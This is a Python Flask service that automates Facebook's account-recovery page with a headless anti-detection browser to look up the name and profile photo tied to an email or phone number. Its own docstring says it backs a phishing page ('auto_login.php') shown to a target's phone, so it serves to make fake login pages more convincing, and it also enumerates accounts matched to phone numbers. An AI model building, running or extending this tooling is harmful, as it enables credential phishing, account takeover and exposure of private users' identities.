#!/usr/bin/env python3
"""
Facebook Profile Lookup Service v2
Real-time profile lookup using m.facebook.com (mobile version)
Based on actual HTML selectors from Facebook's mobile site
"""

import json
import time
import re
import os
import sys
from datetime import datetime
import hashlib
import requests

# Check for Flask
try:
    from flask import Flask, request, jsonify
    from flask_cors import CORS
except ImportError:
    print("[ERROR] Flask not installed. Run: pip3 install flask flask-cors")
    sys.exit(1)

# Check for Playwright
try:
    from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
except ImportError:
    print("[ERROR] Playwright not installed. Run: pip3 install playwright")
    sys.exit(1)


def capture_profile_pic_as_base64(page, img_element):
    """
    Capture the profile picture as base64 data URI.
    This bypasses all CORS/auth issues since we're taking a screenshot.
    """
    try:
        # Take screenshot of just the image element
        screenshot_bytes = img_element.screenshot()
        
        # Convert to base64
        import base64
        base64_data = base64.b64encode(screenshot_bytes).decode('utf-8')
        
        # Return as data URI
        data_uri = f"data:image/png;base64,{base64_data}"
        print(f"[DEBUG] Captured profile pic as base64 ({len(base64_data)} chars)")
        return data_uri
        
    except Exception as e:
        print(f"[DEBUG] Error capturing pic as base64: {e}")
        return None

app = Flask(__name__)
CORS(app)

# Cache directory
CACHE_DIR = os.path.join(os.path.dirname(__file__), 'data', 'lookup_cache')
os.makedirs(CACHE_DIR, exist_ok=True)

# Cache TTL: 24 hours
CACHE_TTL = 86400

# Invalid results to reject
INVALID_NAMES = [
    'enter security code',
    'use your google account',
    'account disabled',
    'find your account',
    'choose your account',
    'search by email',
    'search by mobile',
    'try another way',
    'log in',
    'password'
]


def get_cache_key(email_or_phone):
    """Generate cache key from email/phone"""
    return hashlib.md5(email_or_phone.encode()).hexdigest()


def get_cached_result(email_or_phone):
    """Check cache for existing lookup result"""
    cache_key = get_cache_key(email_or_phone)
    cache_file = os.path.join(CACHE_DIR, f"{cache_key}.json")
    
    if not os.path.exists(cache_file):
        return None
    
    try:
        with open(cache_file, 'r') as f:
            cached = json.load(f)
        
        # Check if cache is still valid
        if time.time() - cached.get('timestamp', 0) < CACHE_TTL:
            result = cached.get('result')
            # Only return if it has a valid profile pic
            if result and result.get('profilePic'):
                return result
    except Exception:
        pass
    
    return None


def save_to_cache(email_or_phone, result):
    """Save lookup result to cache - only if valid"""
    # Don't cache invalid results
    if not result.get('profilePic'):
        return
    
    name = result.get('name', '').lower()
    for invalid in INVALID_NAMES:
        if invalid in name:
            return
    
    cache_key = get_cache_key(email_or_phone)
    cache_file = os.path.join(CACHE_DIR, f"{cache_key}.json")
    
    try:
        with open(cache_file, 'w') as f:
            json.dump({
                'timestamp': time.time(),
                'result': result
            }, f)
    except Exception:
        pass


def is_valid_name(name):
    """Check if the extracted name is valid (not a page element or phone number)"""
    if not name:
        return False
    
    name_str = str(name).strip()
    name_lower = name_str.lower()
    
    # Check against invalid names
    for invalid in INVALID_NAMES:
        if invalid in name_lower:
            return False
    
    # Name should be at least 2 characters
    if len(name_str) < 2:
        return False
    
    # === REJECT PHONE NUMBERS ===
    # Remove common phone formatting characters
    clean = name_str.replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
    
    # PH phone formats: +639XXXXXXXXX or 09XXXXXXXXX
    if clean.startswith('+639') and len(clean) >= 12:
        return False
    if clean.startswith('09') and len(clean) >= 10 and clean.replace('0', '').replace('9', '').isdigit() == False:
        # Check if it's mostly digits
        if sum(c.isdigit() for c in clean) >= 10:
            return False
    
    # Generic: starts with + followed by digits = international phone
    if clean.startswith('+') and clean[1:].isdigit():
        return False
    
    # Generic: all digits and length 10-15 = probably phone number
    if clean.isdigit() and 10 <= len(clean) <= 15:
        return False
    
    # More than 70% digits in the string = probably phone/ID number
    if len(name_str) > 5:
        digit_ratio = sum(c.isdigit() for c in name_str) / len(name_str)
        if digit_ratio > 0.7:
            return False
    
    # Name should not be just numbers
    if name_lower.isdigit():
        return False
    
    return True


def lookup_profile_browser(email_or_phone):
    """
    Lookup Facebook profile using www.facebook.com (DESKTOP version)
    
    NOTE: Lookup service runs on SERVER - uses desktop Facebook for scraping.
    Target's MOBILE device only sees the phishing page (auto_login.php).
    
    VERIFIED SELECTORS:
    - Input: input#identify_email
    - Search: button#did_submit
    - Try another way: a[name="reset_action"]
    - Name (reset): div._amc8, div.fsl.fwb.fcb
    - Name (multi): div._9o4d
    - Pic: img._2qgu[src*="profile/pic.php"]
    """
    try:
        from camoufox.sync_api import NewBrowser
        
        DESKTOP_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        
        with sync_playwright() as p:
            browser = NewBrowser(p, headless=True, i_know_what_im_doing=True)
            context = browser.new_context(
                user_agent=DESKTOP_USER_AGENT,
                viewport={"width": 1280, "height": 800}
            )
            page = context.new_page()
            
            # === STEP 1: Navigate to DESKTOP Facebook identify ===
            print(f"[DEBUG] Navigating to www.facebook.com/login/identify")
            page.goto("https://www.facebook.com/login/identify", wait_until="networkidle", timeout=25000)
            time.sleep(2)
            
            # Find input: input#identify_email
            input_field = None
            for selector in ['input#identify_email', 'input.inputtext._9o1w', 'input[name="email"]']:
                try:
                    input_field = page.wait_for_selector(selector, timeout=3000)
                    if input_field:
                        print(f"[DEBUG] Found input: {selector}")
                        break
                except PlaywrightTimeoutError:
                    continue
            
            if not input_field:
                context.close()
                return {'success': False, 'error': 'Input field not found'}
            
            # Enter value
            print(f"[DEBUG] Entering: {email_or_phone}")
            input_field.click()
            input_field.fill(email_or_phone)
            time.sleep(0.5)
            
            # === STEP 2: Click Search button (button#did_submit) ===
            print(f"[DEBUG] Clicking Search button...")
            try:
                search_btn = page.wait_for_selector('button#did_submit', timeout=3000)
                if search_btn:
                    search_btn.click()
                else:
                    input_field.press("Enter")
            except:
                input_field.press("Enter")
            
            # Wait for result
            print("[DEBUG] Waiting for result...")
            time.sleep(4)
            page_content = page.content()
            
            # === STEP 3: Check if OTP/security code page - click "Try another way" ===
            # This can happen for BOTH email AND phone number
            otp_indicators = [
                "Enter security code",
                "enter your login code",
                "Enter the code",
                "Enter code"
                "We sent a code",
                "sent you a code",
                "Enter the 6-digit code"
            ]
            
            if any(indicator.lower() in page_content.lower() for indicator in otp_indicators):
                print("[DEBUG] OTP/Security code page detected - clicking Try another way")
                try:
                    try_another = None
                    for selector in ['a[name="reset_action"]', 'button:has-text("Try another way")', 'a:has-text("Try another way")', '*:has-text("Try another way")']:
                        try:
                            try_another = page.wait_for_selector(selector, timeout=2000)
                            if try_another:
                                break
                        except:
                            continue
                    
                    if try_another:
                        try_another.click()
                        time.sleep(4)
                        page_content = page.content()
                        print("[DEBUG] Clicked Try another way successfully")
                except Exception as e:
                    print(f"[DEBUG] Error clicking Try another way: {e}")
            
            # === STEP 4: Extract profile based on page type ===
            profile_pic_url = None
            profile_name = None
            accounts = []  # For multiple accounts
            
            # --- SCENARIO A: Multiple accounts (phone number) ---
            if "These accounts matched" in page_content or "Identify your account" in page_content:
                print("[DEBUG] SCENARIO: Multiple accounts")
                
                # Normalize search query for comparison
                search_normalized = email_or_phone.replace(' ', '').replace('-', '').replace('+', '').lower()
                
                # Get ALL accounts with their names and pics
                try:
                    name_elements = page.query_selector_all('div._9o4d')
                    pic_elements = page.query_selector_all('img._2qgu[src*="profile/pic.php"]')
                    
                    print(f"[DEBUG] Found {len(name_elements)} name elements, {len(pic_elements)} pic elements")
                    
                    pic_index = 0
                    for name_elem in name_elements:
                        name_text = name_elem.inner_text().strip()
                        
                        # Skip if it's the search query itself
                        name_normalized = name_text.replace(' ', '').replace('-', '').replace('+', '').lower()
                        if name_normalized == search_normalized:
                            print(f"[DEBUG] Skipping search query: {name_text}")
                            continue
                        
                        # Skip if not a valid name (phone number, etc)
                        if not is_valid_name(name_text):
                            print(f"[DEBUG] Skipping invalid name: {name_text}")
                            continue
                        
                        account = {'name': name_text}
                        
                        # Get corresponding pic
                        if pic_index < len(pic_elements):
                            base64_pic = capture_profile_pic_as_base64(page, pic_elements[pic_index])
                            if base64_pic:
                                account['profilePic'] = base64_pic
                            pic_index += 1
                        
                        accounts.append(account)
                        print(f"[DEBUG] Found valid account: {account['name']}")
                    
                    # Get first valid account's data as main result
                    if accounts:
                        profile_name = accounts[0].get('name', '')
                        profile_pic_url = accounts[0].get('profilePic', '')
                    else:
                        print("[DEBUG] No valid accounts found, trying pic only")
                        # At least try to get a profile pic even if no valid name
                        if pic_elements:
                            base64_pic = capture_profile_pic_as_base64(page, pic_elements[0])
                            if base64_pic:
                                profile_pic_url = base64_pic
                        
                except Exception as e:
                    print(f"[DEBUG] Error extracting multiple accounts: {e}")
            
            # --- SCENARIO B: Reset password page (after Try another way) ---
            elif "Reset your password" in page_content or "How do you want" in page_content or "Facebook user" in page_content:
                print("[DEBUG] SCENARIO: Reset password page")
                
                # Name: try multiple selectors
                name_selectors = ['div._amc8', 'div.fsl.fwb.fcb', 'span._amc8', 'div._9o4d']
                for sel in name_selectors:
                    try:
                        name_elem = page.wait_for_selector(sel, timeout=2000)
                        if name_elem:
                            text = name_elem.inner_text().strip()
                            if text and is_valid_name(text):
                                profile_name = text
                                print(f"[DEBUG] Found name with {sel}: {profile_name}")
                                break
                    except:
                        continue
                
                # Pic: img._2qgu
                try:
                    pic_elem = page.wait_for_selector('img._2qgu[src*="profile/pic.php"]', timeout=3000)
                    if pic_elem:
                        base64_pic = capture_profile_pic_as_base64(page, pic_elem)
                        if base64_pic:
                            profile_pic_url = base64_pic
                            print("[DEBUG] Captured profile pic")
                except:
                    pass
            
            # --- SCENARIO C: Google account popup ---
            elif "Use your Google account" in page_content:
                print("[DEBUG] SCENARIO: Google account popup")
                
                # Name: div.fsl.fwb.fcb
                try:
                    name_elem = page.wait_for_selector('div.fsl.fwb.fcb', timeout=3000)
                    if name_elem:
                        profile_name = name_elem.inner_text().strip()
                        print(f"[DEBUG] Found name: {profile_name}")
                except:
                    pass
                
                # Pic
                try:
                    pic_elem = page.wait_for_selector('img._2qgu[src*="profile/pic.php"]', timeout=3000)
                    if pic_elem:
                        base64_pic = capture_profile_pic_as_base64(page, pic_elem)
                        if base64_pic:
                            profile_pic_url = base64_pic
                except:
                    pass
            
            # --- FALLBACK: Try all selectors ---
            else:
                print("[DEBUG] SCENARIO: Fallback - checking more selectors")
                
                for selector in ['div._amc8', 'div._9o4d', 'div.fsl.fwb.fcb', 'span._amc8']:
                    try:
                        name_elem = page.wait_for_selector(selector, timeout=1500)
                        if name_elem:
                            text = name_elem.inner_text().strip()
                            if is_valid_name(text):
                                profile_name = text
                                print(f"[DEBUG] Found name (fallback): {profile_name}")
                                break
                    except:
                        continue
                
                # Extra: Try regex for name in page source
                if not profile_name:
                    import re as regex_module
                    name_match = regex_module.search(r'<div[^>]*class="[^"]*_amc8[^"]*"[^>]*>([^<]+)</div>', page_content)
                    if name_match:
                        text = name_match.group(1).strip()
                        if is_valid_name(text):
                            profile_name = text
                            print(f"[DEBUG] Found name via regex: {profile_name}")
                
                try:
                    pic_elem = page.wait_for_selector('img._2qgu[src*="profile/pic.php"], img[src*="profile/pic.php"]', timeout=3000)
                    if pic_elem:
                        base64_pic = capture_profile_pic_as_base64(page, pic_elem)
                        if base64_pic:
                            profile_pic_url = base64_pic
                except:
                    pass
            
            context.close()
            
            # === RETURN RESULT ===
            result = {
                'success': bool(profile_pic_url or profile_name),
                'profilePic': profile_pic_url or '',
                'name': profile_name or '',
                'method': 'browser_facebook_v3'
            }
            
            # Include multiple accounts if found
            if accounts and len(accounts) > 1:
                result['multiple_accounts'] = True
                result['accounts'] = accounts
            
            return result
            
    except PlaywrightTimeoutError as e:
        print(f"[ERROR] Timeout: {e}")
        return {
            'success': False,
            'profilePic': '',
            'name': '',
            'method': 'browser_m_facebook',
            'error': 'Timeout'
        }
    except Exception as e:
        print(f"[ERROR] Exception: {e}")
        return {
            'success': False,
            'profilePic': '',
            'name': '',
            'method': 'browser_m_facebook',
            'error': str(e)
        }


@app.route('/lookup', methods=['GET'])
def lookup():
    """Lookup Facebook profile by email or phone"""
    email_or_phone = request.args.get('email', '').strip()
    
    if not email_or_phone:
        return jsonify({
            'success': False,
            'error': 'Email or phone required',
            'profilePic': '',
            'name': '',
            'method': 'none'
        }), 400
    
    print(f"\n[LOOKUP] Request for: {email_or_phone}")
    
    # Check cache first
    cached_result = get_cached_result(email_or_phone)
    if cached_result:
        print(f"[LOOKUP] Cache hit!")
        cached_result['cached'] = True
        return jsonify(cached_result)
    
    # Perform lookup
    start_time = time.time()
    result = lookup_profile_browser(email_or_phone)
    elapsed_time = time.time() - start_time
    
    # Cache successful results with valid profile pic
    if result.get('success') and result.get('profilePic'):
        save_to_cache(email_or_phone, result)
    
    # Add timing info
    result['lookup_time'] = round(elapsed_time, 2)
    result['cached'] = False
    
    print(f"[LOOKUP] Result: success={result.get('success')}, pic={'Yes' if result.get('profilePic') else 'No'}, name={result.get('name', '')[:30]}")
    
    return jsonify(result)


@app.route('/health', methods=['GET'])
def health():
    """Health check endpoint"""
    return jsonify({
        'status': 'ok',
        'service': 'fb_lookup_service_v2',
        'version': '2.0',
        'timestamp': datetime.now().isoformat()
    })


@app.route('/clear-cache', methods=['POST'])
def clear_cache():
    """Clear all cached results"""
    try:
        import glob
        cache_files = glob.glob(os.path.join(CACHE_DIR, '*.json'))
        for f in cache_files:
            os.remove(f)
        return jsonify({'success': True, 'cleared': len(cache_files)})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


if __name__ == '__main__':
    print("=" * 60)
    print("Facebook Profile Lookup Service v2")
    print("Using m.facebook.com (mobile version)")
    print("=" * 60)
    print(f"[INFO] Endpoint: http://localhost:5000/lookup?email=<email_or_phone>")
    print(f"[INFO] Health: http://localhost:5000/health")
    print(f"[INFO] Clear cache: POST http://localhost:5000/clear-cache")
    print("=" * 60)
    app.run(host='127.0.0.1', port=5000, debug=False, threaded=True)
